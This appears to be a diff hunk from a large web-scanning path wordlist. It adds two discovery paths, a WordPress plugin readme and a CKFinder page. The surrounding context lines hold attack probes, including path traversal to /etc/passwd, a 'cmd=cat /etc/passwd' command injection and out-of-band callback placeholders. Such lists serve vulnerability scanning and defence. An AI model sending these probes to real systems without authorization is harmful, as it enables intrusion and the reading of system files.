@@ -8944,3 +8944,5 @@ test&access={{interactsh-url}}&remote_url={{interactsh-url}}&admin={{interactsh-
 /error?StatusCode=404&file=~/web.config
 /view/theme/redbasic/php/style.pcss?f=&puid=2&schema=../../../../shell&v=7.1.6&cmd=cat%20/etc/passwd
 /ViewSource/?file=de/robv/android/xposed/installer/repo/RepoDb.java&md5=36570c6fac687ffe08107e6a72bd3da7/../../../../../../../../../../../private/etc/passwd%00&type=apk
+/wp-content/plugins/acclectic-media-organizer/readme.txt
+/ckfinder/ckfinder.html
